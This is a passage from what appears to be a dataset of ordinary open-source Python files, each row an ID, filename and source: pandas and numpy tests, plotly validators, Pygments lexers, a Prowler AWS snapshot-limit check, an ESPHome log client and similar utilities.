    Abstract class used by `simplefilter` to create simple
    function filters on the fly. The `simplefilter` decorator
    automatically creates subclasses of this class for
    functions passed to it.
    """"""
    function = None

    def __init__(self, **options):
        if not hasattr(self, 'function'):
            raise TypeError('%r used without bound function' %
                            self.__class__.__name__)
        Filter.__init__(self, **options)

    def filter(self, lexer, stream):
        # pylint: disable=not-callable
        yield from self.function(lexer, stream, self.options)"
JD15	JD15-sc-echo-server.py	"#!/usr/bin/python

""""""
Simple console example that echos websocket messages, upper cased.
""""""

import asyncio
import logging

from typing import Callable

from bacpypes3.settings import settings
from bacpypes3.debugging import bacpypes_debugging, ModuleLogger
from bacpypes3.argparse import ArgumentParser

from bacpypes3.comm import Client, bind
from bacpypes3.pdu import PDU
from bacpypes3.sc.service import SCNodeSwitch


# some debugging
_debug = 0
_log = ModuleLogger(globals())


@bacpypes_debugging
class Echo(Client[PDU]):
    """"""
    Echo
    """"""

    _debug: Callable[..., None]

    async def confirmation(self, pdu: PDU) -> None:
        if _debug:
            Echo._debug(""confirmation %r"", pdu)

        ack = PDU(pdu.pduData.upper(), destination=pdu.pduSource)
        if _debug:
            Echo._debug(""    - ack: %r"", ack)

        await self.request(ack)


async def main() -> None:
    switch = None

    try:
        parser = ArgumentParser()
        parser.add_argument(
            ""--host"",
            type=str,
            default=""localhost"",
            help=""listening host address"",
        )
        parser.add_argument(
            ""--port"",
            type=int,
            default=8765,
            help=""listening port"",
        )
        args = parser.parse_args()
        if _debug:
            _log.debug(""settings: %r"", settings)

        # build a very small stack
        echo = Echo()
        switch = SCNodeSwitch(
            host=args.host, port=args.port, dc_support=True, hub_support=True
        )
        bind(echo, switch)

        # run a really long time
        await asyncio.Future()

    except KeyboardInterrupt:
        if _debug:
            _log.debug(""keyboard interrupt"")
    finally:
        if switch:
            await switch.close()


if __name__ == ""__main__"":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass"
JD501	JD501-test_validate_args.py	"import pytest

from pandas.util._validators import validate_args

_fname = ""func""


def test_bad_min_fname_arg_count():
    msg = ""'max_fname_arg_count' must be non-negative""

    with pytest.raises(ValueError, match=msg):
        validate_args(_fname, (None,), -1, ""foo"")


def test_bad_arg_length_max_value_single():
    args = (None, None)
    compat_args = (""foo"",)

    min_fname_arg_count = 0
    max_length = len(compat_args) + min_fname_arg_count
    actual_length = len(args) + min_fname_arg_count
    msg = (
        rf""{_fname}\(\) takes at most {max_length} ""
        rf""argument \({actual_length} given\)""
    )

    with pytest.raises(TypeError, match=msg):
        validate_args(_fname, args, min_fname_arg_count, compat_args)


def test_bad_arg_length_max_value_multiple():
    args = (None, None)
    compat_args = {""foo"": None}

    min_fname_arg_count = 2
    max_length = len(compat_args) + min_fname_arg_count
    actual_length = len(args) + min_fname_arg_count
    msg = (
        rf""{_fname}\(\) takes at most {max_length} ""
        rf""arguments \({actual_length} given\)""
    )

    with pytest.raises(TypeError, match=msg):
        validate_args(_fname, args, min_fname_arg_count, compat_args)


@pytest.mark.parametrize(""i"", range(1, 3))
def test_not_all_defaults(i):
    bad_arg = ""foo""
    msg = (
        f""the '{bad_arg}' parameter is not supported ""
        rf""in the pandas implementation of {_fname}\(\)""
    )

    compat_args = {""foo"": 2, ""bar"": -1, ""baz"": 3}
    arg_vals = (1, -1, 3)

    with pytest.raises(ValueError, match=msg):
        validate_args(_fname, arg_vals[:i], 2, compat_args)


def test_validation():
    # No exceptions should be raised.
    validate_args(_fname, (None,), 2, {""out"": None})

    compat_args = {""axis"": 1, ""out"": None}
    validate_args(_fname, (1, None), 2, compat_args)"
JD396	JD396-search_with_ordering.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Call Retail API to search for a products in a catalog, order the results by different product fields.
#

import google.auth
from google.cloud.retail import SearchRequest, SearchServiceClient

project_id = google.auth.default()[1]


# get search service request:
def get_search_request(query: str, order: str):
    default_search_placement = (
        ""projects/""
        + project_id
        + ""/locations/global/catalogs/default_catalog/placements/default_search""
    )

    search_request = SearchRequest()
    search_request.placement = default_search_placement
    search_request.query = query
    search_request.order_by = order
    search_request.visitor_id = ""123456""  # A unique identifier to track visitors
    search_request.page_size = 10

    print(""---search request---"")
    print(search_request)

    return search_request


# call the Retail Search:
def search():
    # TRY DIFFERENT ORDERING EXPRESSIONS HERE:
    order = ""price desc""

    search_request = get_search_request(""Hoodie"", order)
    search_response = SearchServiceClient().search(search_request)

    print(""---search response---"")
    if not search_response.results:
        print(""The search operation returned no matching results."")
    else:
        print(search_response)
    return search_response


search()"
JY180	JY180-pydevd_fix_code.py	"def _fix_contents(filename, contents):
    import re

    contents = re.sub(
        r""from bytecode"", r'from _pydevd_frame_eval.vendored.bytecode', contents, flags=re.MULTILINE
    )

    contents = re.sub(
        r""import bytecode"", r'from _pydevd_frame_eval.vendored import bytecode', contents, flags=re.MULTILINE
    )

    # This test will import the wrong setup (we're not interested in it).
    contents = re.sub(
        r""def test_version\(self\):"", r'def skip_test_version(self):', contents, flags=re.MULTILINE
    )

    if filename.startswith('test_'):
        if 'pytestmark' not in contents:
            pytest_mark = '''
import pytest
from tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON
from tests_python.debug_constants import TEST_CYTHON
pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')
'''
            contents = pytest_mark + contents
    return contents


def main():
    import os

    # traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in os.walk(os.path.dirname(__file__)):
        path = root.split(os.sep)
        for filename in files:
            if filename.endswith('.py') and filename != 'pydevd_fix_code.py':
                with open(os.path.join(root, filename), 'r') as stream:
                    contents = stream.read()

                new_contents = _fix_contents(filename, contents)
                if contents != new_contents:
                    print('fixed ', os.path.join(root, filename))
                    with open(os.path.join(root, filename), 'w') as stream:
                        stream.write(new_contents)

#             print(len(path) * '---', filename)


if __name__ == '__main__':
    main()"
JD245	JD245-test__version.py	"""""""Tests for the NumpyVersion class.

""""""
from numpy.testing import assert_, assert_raises
from numpy.lib import NumpyVersion


def test_main_versions():
    assert_(NumpyVersion('1.8.0') == '1.8.0')
    for ver in ['1.9.0', '2.0.0', '1.8.1', '10.0.1']:
        assert_(NumpyVersion('1.8.0') < ver)

    for ver in ['1.7.0', '1.7.1', '0.9.9']:
        assert_(NumpyVersion('1.8.0') > ver)


def test_version_1_point_10():
    # regression test for gh-2998.
    assert_(NumpyVersion('1.9.0') < '1.10.0')
    assert_(NumpyVersion('1.11.0') < '1.11.1')
    assert_(NumpyVersion('1.11.0') == '1.11.0')
    assert_(NumpyVersion('1.99.11') < '1.99.12')


def test_alpha_beta_rc():
    assert_(NumpyVersion('1.8.0rc1') == '1.8.0rc1')
    for ver in ['1.8.0', '1.8.0rc2']:
        assert_(NumpyVersion('1.8.0rc1') < ver)

    for ver in ['1.8.0a2', '1.8.0b3', '1.7.2rc4']:
        assert_(NumpyVersion('1.8.0rc1') > ver)

    assert_(NumpyVersion('1.8.0b1') > '1.8.0a2')


def test_dev_version():
    assert_(NumpyVersion('1.9.0.dev-Unknown') < '1.9.0')
    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev-ffffffff']:
        assert_(NumpyVersion('1.9.0.dev-f16acvda') < ver)

    assert_(NumpyVersion('1.9.0.dev-f16acvda') == '1.9.0.dev-11111111')


def test_dev_a_b_rc_mixed():
    assert_(NumpyVersion('1.9.0a2.dev-f16acvda') == '1.9.0a2.dev-11111111')
    assert_(NumpyVersion('1.9.0a2.dev-6acvda54') < '1.9.0a2')


def test_dev0_version():
    assert_(NumpyVersion('1.9.0.dev0+Unknown') < '1.9.0')
    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev0+ffffffff']:
        assert_(NumpyVersion('1.9.0.dev0+f16acvda') < ver)

    assert_(NumpyVersion('1.9.0.dev0+f16acvda') == '1.9.0.dev0+11111111')


def test_dev0_a_b_rc_mixed():
    assert_(NumpyVersion('1.9.0a2.dev0+f16acvda') == '1.9.0a2.dev0+11111111')
    assert_(NumpyVersion('1.9.0a2.dev0+6acvda54') < '1.9.0a2')


def test_raises():
    for ver in ['1.9', '1,9.0', '1.7.x']:
        assert_raises(ValueError, NumpyVersion, ver)"
JY22	JY22-pointless.py	"""""""
    pygments.lexers.pointless
    ~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Pointless.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, words
from pygments.token import Comment, Error, Keyword, Name, Number, Operator, \
    Punctuation, String, Text

__all__ = ['PointlessLexer']


class PointlessLexer(RegexLexer):
    """"""
    For Pointless source code.

    .. versionadded:: 2.7
    """"""

    name = 'Pointless'
    url = 'https://ptls.dev'
    aliases = ['pointless']
    filenames = ['*.ptls']

    ops = words([
        ""+"", ""-"", ""*"", ""/"", ""**"", ""%"", ""+="", ""-="", ""*="",
        ""/="", ""**="", ""%="", ""|>"", ""="", ""=="", ""!="", ""<"", "">"",
        ""<="", "">="", ""=>"", ""$"", ""++"",
    ])

    keywords = words([
        ""if"", ""then"", ""else"", ""where"", ""with"", ""cond"",
        ""case"", ""and"", ""or"", ""not"", ""in"", ""as"", ""for"",
        ""requires"", ""throw"", ""try"", ""catch"", ""when"",
        ""yield"", ""upval"",
    ], suffix=r'\b')

    tokens = {
        'root': [
            (r'[ \n\r]+', Text),
            (r'--.*$', Comment.Single),
            (r'""""""', String, 'multiString'),
            (r'""', String, 'string'),
            (r'[\[\](){}:;,.]', Punctuation),
            (ops, Operator),
            (keywords, Keyword),
            (r'\d+|\d*\.\d+', Number),
            (r'(true|false)\b', Name.Builtin),
            (r'[A-Z][a-zA-Z0-9]*\b', String.Symbol),
            (r'output\b', Name.Variable.Magic),
            (r'(export|import)\b', Keyword.Namespace),
            (r'[a-z][a-zA-Z0-9]*\b', Name.Variable)
        ],
        'multiString': [
            (r'\\.', String.Escape),
            (r'""""""', String, '#pop'),
            (r'""', String),
            (r'[^\\""]+', String),
        ],
        'string': [
            (r'\\.', String.Escape),
            (r'""', String, '#pop'),
            (r'\n', Error),
            (r'[^\\""]+', String),
        ],
    }"
JD497	JD497-predict.py	"import os
import json

import torch
from PIL import Image
from torchvision import transforms
import matplotlib.pyplot as plt

from model import swin_tiny_patch4_window7_224 as create_model


def main():
    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")

    img_size = 224
    data_transform = transforms.Compose(
        [transforms.Resize(int(img_size * 1.14)),
         transforms.CenterCrop(img_size),
         transforms.ToTensor(),
         transforms.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])])

    # load image
    img_path = ""../tulip.jpg""
    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)
    img = Image.open(img_path)
    plt.imshow(img)
    # [N, C, H, W]
    img = data_transform(img)
    # expand batch dimension
    img = torch.unsqueeze(img, dim=0)

    # read class_indict
    json_path = './class_indices.json'
    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)

    with open(json_path, ""r"") as f:
        class_indict = json.load(f)

    # create model
    model = create_model(num_classes=5).to(device)
    # load model weights
    model_weight_path = ""./weights/model-9.pth""
    model.load_state_dict(torch.load(model_weight_path, map_location=device))
    model.eval()
    with torch.no_grad():
        # predict class
        output = torch.squeeze(model(img.to(device))).cpu()
        predict = torch.softmax(output, dim=0)
        predict_cla = torch.argmax(predict).numpy()

    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],
                                                 predict[predict_cla].numpy())
    plt.title(print_res)
    for i in range(len(predict)):
        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],
                                                  predict[i].numpy()))
    plt.show()


if __name__ == '__main__':
    main()"
JY260	JY260-serializers.py	"from rest_framework import serializers
from .models import Notification
from .tasks import mark_as_read
from drf_spectacular.utils import extend_schema_serializer, OpenApiExample
from drf_queryfields.mixins import QueryFieldsMixin

user_representation = {
    ""id"": ""3fa85f64-5717-4562-b3fc-2c963f66afa6"",
    ""username"": ""string"",
    ""full_name"": ""string"",
    ""picture"": ""example.com/media/profile_pic/32435223-2532.jpg"",
}


class RelatedUser(serializers.RelatedField):
    def to_representation(self, value):
        bostedBy = {
            ""id"": value.id,
            ""username"": value.username,
            ""full_name"": value.full_name,
            ""picture"": value.profile_pic.url,
        }
        return bostedBy


@extend_schema_serializer(
    exclude_fields=[""sender"", ""receiver""],
    examples=[
        OpenApiExample(
            name=""notifications data"",
            value={
                ""id"": ""3fa85f64-5717-4562-b3fc-2c963f66afa6"",
                ""sender"": user_representation,
                ""receiver"": user_representation,
                ""created"": ""2022-12-17T14:39:17.902Z"",
                ""modified"": ""2022-12-17T14:39:17.902Z"",
                ""data"": {
                    ""additionalProp1"": ""string"",
                    ""additionalProp2"": ""string"",
                    ""additionalProp3"": ""string"",
                },
                ""seen"": True,
            },
        )
    ],
)
class NotificationSerialzier(QueryFieldsMixin, serializers.ModelSerializer):

    sender = RelatedUser(read_only=True)
    receiver = RelatedUser(read_only=True)

    class Meta:
        model = Notification
        fields = ""__all__""
        read_only_fields = (""seen"", ""data"", ""created"", ""modified"")

    def update(self, instance, validated_data):
        mark_as_read.delay(instance.id)
        return instance"
JD346	JD346-directoryservice_directory_snapshots_limit.py	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.directoryservice.directoryservice_client import (
    directoryservice_client,
)

SNAPSHOT_LIMIT_THRESHOLD = 2
""""""Number of remaining snapshots to reach the limit""""""


class directoryservice_directory_snapshots_limit(Check):
    def execute(self):
        findings = []
        for directory in directoryservice_client.directories.values():
            report = Check_Report_AWS(self.metadata())
            report.region = directory.region
            report.resource_id = directory.id
            if directory.snapshots_limits:
                if directory.snapshots_limits.manual_snapshots_limit_reached:
                    report.status = ""FAIL""
                    report.status_extended = f""Directory Service {directory.id} reached {directory.snapshots_limits.manual_snapshots_limit} Snapshots limit""
                else:
                    limit_remaining = (
                        directory.snapshots_limits.manual_snapshots_limit
                        - directory.snapshots_limits.manual_snapshots_current_count
                    )
                    if limit_remaining <= SNAPSHOT_LIMIT_THRESHOLD:
                        report.status = ""FAIL""
                        report.status_extended = f""Directory Service {directory.id} is about to reach {directory.snapshots_limits.manual_snapshots_limit} Snapshots which is the limit""
                    else:
                        report.status = ""PASS""
                        report.status_extended = f""Directory Service {directory.id} is using {directory.snapshots_limits.manual_snapshots_current_count} out of {directory.snapshots_limits.manual_snapshots_limit} from the Snapshots Limit""
                findings.append(report)

        return findings"
JY312	JY312-_marker.py	"import _plotly_utils.basevalidators


class MarkerValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""marker"", parent_name=""pointcloud"", **kwargs):
        super(MarkerValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Marker""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            blend
                Determines if colors are blended together for a
                translucency effect in case `opacity` is
                specified as a value less then `1`. Setting
                `blend` to `true` reduces zoom/pan speed if
                used with large numbers of points.
            border
                :class:`plotly.graph_objects.pointcloud.marker.
                Border` instance or dict with compatible
                properties
            color
                Sets the marker fill color. It accepts a
                specific color. If the color is not fully
                opaque and there are hundreds of thousands of
                points, it may cause slower zooming and
                panning.
            opacity
                Sets the marker opacity. The default value is
                `1` (fully opaque). If the markers are not
                fully opaque and there are hundreds of
                thousands of points, it may cause slower
                zooming and panning. Opacity fades the color
                even if `blend` is left on `false` even if
                there is no translucency effect in that case.
            sizemax
                Sets the maximum size (in px) of the rendered
                marker points. Effective when the `pointcloud`
                shows only few points.
            sizemin
                Sets the minimum size (in px) of the rendered
                marker points, effective when the `pointcloud`
                shows a million or more points.
"""""",
            ),
            **kwargs,
        )"
JY463	JY463-test_fillna.py	"import numpy as np
import pytest

from pandas import CategoricalIndex
import pandas._testing as tm


class TestFillNA:
    def test_fillna_categorical(self):
        # GH#11343
        idx = CategoricalIndex([1.0, np.nan, 3.0, 1.0], name=""x"")
        # fill by value in categories
        exp = CategoricalIndex([1.0, 1.0, 3.0, 1.0], name=""x"")
        tm.assert_index_equal(idx.fillna(1.0), exp)

        cat = idx._data

        # fill by value not in categories raises TypeError on EA, casts on CI
        msg = ""Cannot setitem on a Categorical with a new category""
        with pytest.raises(TypeError, match=msg):
            cat.fillna(2.0)

        result = idx.fillna(2.0)
        expected = idx.astype(object).fillna(2.0)
        tm.assert_index_equal(result, expected)

    def test_fillna_copies_with_no_nas(self):
        # Nothing to fill, should still get a copy for the Categorical method,
        #  but OK to get a view on CategoricalIndex method
        ci = CategoricalIndex([0, 1, 1])
        result = ci.fillna(0)
        assert result is not ci
        assert tm.shares_memory(result, ci)

        # But at the EA level we always get a copy.
        cat = ci._data
        result = cat.fillna(0)
        assert result._ndarray is not cat._ndarray
        assert result._ndarray.base is None
        assert not tm.shares_memory(result, cat)

    def test_fillna_validates_with_no_nas(self):
        # We validate the fill value even if fillna is a no-op
        ci = CategoricalIndex([2, 3, 3])
        cat = ci._data

        msg = ""Cannot setitem on a Categorical with a new category""
        res = ci.fillna(False)
        # nothing to fill, so we dont cast
        tm.assert_index_equal(res, ci)

        # Same check directly on the Categorical
        with pytest.raises(TypeError, match=msg):
            cat.fillna(False)"
JD417	JD417-utils.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

import typing

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.utils import Prehashed

if typing.TYPE_CHECKING:
    from cryptography.hazmat.backends.openssl.backend import Backend


def _evp_pkey_derive(backend: ""Backend"", evp_pkey, peer_public_key) -> bytes:
    ctx = backend._lib.EVP_PKEY_CTX_new(evp_pkey, backend._ffi.NULL)
    backend.openssl_assert(ctx != backend._ffi.NULL)
    ctx = backend._ffi.gc(ctx, backend._lib.EVP_PKEY_CTX_free)
    res = backend._lib.EVP_PKEY_derive_init(ctx)
    backend.openssl_assert(res == 1)
    res = backend._lib.EVP_PKEY_derive_set_peer(ctx, peer_public_key._evp_pkey)
    if res != 1:
        errors_with_text = backend._consume_errors_with_text()
        raise ValueError(""Error computing shared key."", errors_with_text)

    keylen = backend._ffi.new(""size_t *"")
    res = backend._lib.EVP_PKEY_derive(ctx, backend._ffi.NULL, keylen)
    backend.openssl_assert(res == 1)
    backend.openssl_assert(keylen[0] > 0)
    buf = backend._ffi.new(""unsigned char[]"", keylen[0])
    res = backend._lib.EVP_PKEY_derive(ctx, buf, keylen)
    if res != 1:
        errors_with_text = backend._consume_errors_with_text()
        raise ValueError(""Error computing shared key."", errors_with_text)

    return backend._ffi.buffer(buf, keylen[0])[:]


def _calculate_digest_and_algorithm(
    data: bytes,
    algorithm: typing.Union[Prehashed, hashes.HashAlgorithm],
) -> typing.Tuple[bytes, hashes.HashAlgorithm]:
    if not isinstance(algorithm, Prehashed):
        hash_ctx = hashes.Hash(algorithm)
        hash_ctx.update(data)
        data = hash_ctx.finalize()
    else:
        algorithm = algorithm._algorithm

    if len(data) != algorithm.digest_size:
        raise ValueError(
            ""The provided data must be the same length as the hash ""
            ""algorithm's digest size.""
        )

    return (data, algorithm)"
JD158	JD158-hubconf.py	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
""""""isort:skip_file""""""

import functools
import importlib


dependencies = [
    ""dataclasses"",
    ""hydra"",
    ""numpy"",
    ""omegaconf"",
    ""regex"",
    ""requests"",
    ""torch"",
]


# Check for required dependencies and raise a RuntimeError if any are missing.
missing_deps = []
for dep in dependencies:
    try:
        importlib.import_module(dep)
    except ImportError:
        # Hack: the hydra package is provided under the ""hydra-core"" name in
        # pypi. We don't want the user mistakenly calling `pip install hydra`
        # since that will install an unrelated package.
        if dep == ""hydra"":
            dep = ""hydra-core""
        missing_deps.append(dep)
if len(missing_deps) > 0:
    raise RuntimeError(""Missing dependencies: {}"".format("", "".join(missing_deps)))


# only do fairseq imports after checking for dependencies
from fairseq.hub_utils import (  # noqa; noqa
    BPEHubInterface as bpe,
    TokenizerHubInterface as tokenizer,
)
from fairseq.models import MODEL_REGISTRY  # noqa


# torch.hub doesn't build Cython components, so if they are not found then try
# to build them here
try:
    import fairseq.data.token_block_utils_fast  # noqa
except ImportError:
    try:
        import cython  # noqa
        import os
        from setuptools import sandbox

        sandbox.run_setup(
            os.path.join(os.path.dirname(__file__), ""setup.py""),
            [""build_ext"", ""--inplace""],
        )
    except ImportError:
        print(
            ""Unable to build Cython components. Please make sure Cython is ""
            ""installed if the torch.hub model you are loading depends on it.""
        )


# automatically expose models defined in FairseqModel::hub_models
for _model_type, _cls in MODEL_REGISTRY.items():
    for model_name in _cls.hub_models().keys():
        globals()[model_name] = functools.partial(
            _cls.from_pretrained,
            model_name,
        )"
JY269	JY269-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scattermapbox"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD146	JD146-test_tx_endpoint_plugins.py	"###############################################################################
#
# The MIT License (MIT)
#
# Copyright (c) typedef int GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
###############################################################################

from twisted.trial.unittest import TestCase


class PluginTests(TestCase):
    if True:
        skip = ""Plugins don't work under Python3 yet""

    def test_import(self):
        from twisted.plugins import autobahn_endpoints
        self.assertTrue(hasattr(autobahn_endpoints, 'AutobahnClientParser'))

    def test_parse_client_basic(self):
        from twisted.plugins import autobahn_endpoints
        self.assertTrue(hasattr(autobahn_endpoints, 'AutobahnClientParser'))
        from twisted.internet.endpoints import clientFromString, quoteStringArgument
        from twisted.internet import reactor

        ep_string = ""autobahn:{0}:url={1}"".format(
            quoteStringArgument('tcp:localhost:9000'),
            quoteStringArgument('ws://localhost:9000'),
        )
        # we're just testing that this doesn't fail entirely
        clientFromString(reactor, ep_string)"
JY202	JY202-unnecessary_format_string.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
#
from viktor._vendor import libcst
import viktor._vendor.libcst.matchers as m
from viktor._vendor.libcst.codemod import VisitorBasedCodemodCommand


class UnnecessaryFormatString(VisitorBasedCodemodCommand):

    DESCRIPTION: str = (
        ""Converts f-strings which perform no formatting to regular strings.""
    )

    @m.leave(m.FormattedString(parts=(m.FormattedStringText(),)))
    def _check_formatted_string(
        self,
        _original_node: libcst.FormattedString,
        updated_node: libcst.FormattedString,
    ) -> libcst.BaseExpression:
        old_string_inner = libcst.ensure_type(
            updated_node.parts[0], libcst.FormattedStringText
        ).value
        if ""{{"" in old_string_inner or ""}}"" in old_string_inner:
            # there are only two characters we need to worry about escaping.
            return updated_node

        old_string_literal = updated_node.start + old_string_inner + updated_node.end
        new_string_literal = (
            updated_node.start.replace(""f"", """").replace(""F"", """")
            + old_string_inner
            + updated_node.end
        )

        old_string_evaled = eval(old_string_literal)  # noqa
        new_string_evaled = eval(new_string_literal)  # noqa
        if old_string_evaled != new_string_evaled:
            warn_message = (
                f""Attempted to codemod |{old_string_literal}| to ""
                + f""|{new_string_literal}| but don't eval to the same! First is |{old_string_evaled}| and ""
                + f""second is |{new_string_evaled}|""
            )
            self.warn(warn_message)
            return updated_node

        return libcst.SimpleString(new_string_literal)"
JY362	JY362-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""histogram2d.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY510	JY510-client.py	"import asyncio
import logging
from datetime import datetime
from typing import Optional

from aioesphomeapi import APIClient, ReconnectLogic, APIConnectionError, LogLevel
import zeroconf

from esphome.const import CONF_KEY, CONF_PORT, CONF_PASSWORD, __version__
from esphome.util import safe_print
from . import CONF_ENCRYPTION

_LOGGER = logging.getLogger(__name__)


async def async_run_logs(config, address):
    conf = config[""api""]
    port: int = int(conf[CONF_PORT])
    password: str = conf[CONF_PASSWORD]
    noise_psk: Optional[str] = None
    if CONF_ENCRYPTION in conf:
        noise_psk = conf[CONF_ENCRYPTION][CONF_KEY]
    _LOGGER.info(""Starting log output from %s using esphome API"", address)
    cli = APIClient(
        address,
        port,
        password,
        client_info=f""ESPHome Logs {__version__}"",
        noise_psk=noise_psk,
    )
    first_connect = True

    def on_log(msg):
        time_ = datetime.now().time().strftime(""[%H:%M:%S]"")
        text = msg.message.decode(""utf8"", ""backslashreplace"")
        safe_print(time_ + text)

    async def on_connect():
        nonlocal first_connect
        try:
            await cli.subscribe_logs(
                on_log,
                log_level=LogLevel.LOG_LEVEL_VERY_VERBOSE,
                dump_config=first_connect,
            )
            first_connect = False
        except APIConnectionError:
            cli.disconnect()

    async def on_disconnect():
        _LOGGER.warning(""Disconnected from API"")

    zc = zeroconf.Zeroconf()
    reconnect = ReconnectLogic(
        client=cli,
        on_connect=on_connect,
        on_disconnect=on_disconnect,
        zeroconf_instance=zc,
    )
    await reconnect.start()

    try:
        while True:
            await asyncio.sleep(60)
    except KeyboardInterrupt:
        await reconnect.stop()
        zc.close()


def run_logs(config, address):
    asyncio.run(async_run_logs(config, address))"
JD76	JD76-intranges.py	"""""""
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question ""was x present
in the original list?"" in time O(log(# runs)).
""""""

import bisect
from typing import List, Tuple

def intranges_from_list(list_: List[int]) -> Tuple[int, ...]:
    """"""Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """"""

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i+1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i+1]-1:
                continue
        current_range = sorted_list[last_write+1:i+1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)

def _encode_range(start: int, end: int) -> int:
    return (start << 32) | end

def _decode_range(r: int) -> Tuple[int, int]:
